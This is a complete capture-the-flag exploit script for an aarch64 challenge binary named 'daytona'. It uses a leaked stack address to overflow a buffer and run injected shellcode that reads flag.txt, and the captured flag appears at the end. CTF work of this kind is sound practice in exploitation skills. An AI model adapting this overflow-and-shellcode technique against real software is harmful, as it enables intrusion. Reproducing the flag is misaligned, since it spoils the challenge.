#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.arch = 'aarch64'
exe = context.binary = ELF('./daytona', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x0000000000400850
c
'''

def start(argv=[]):
    if args.GDB:
        return process(["qemu-aarch64-static","-g","5000", "-L", "/usr/arm-linux-gnueabi/", exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process(["qemu-aarch64-static", "-L", "/usr/arm-linux-gnueabi/", exe.path])

# ==================== EXPLOIT ====================
p = start()

ru(b'I was going ')
stack_leak = int(ru(b' MPH', drop=True))
slog('Stack Leak @ %#x', stack_leak)


shellcode = asm(shellcraft.cat('./flag.txt'))
print(disasm(shellcode))

payload = b'A' * 0x48 + p64(stack_leak + 0x75 + 0x48 + 0x8) + shellcode
sl(payload)

interactive(flag=False)
# sun{ARM64_shEl1c0de_!s_pr3ttY_n3a7_dOnT_y0u_thInk?}
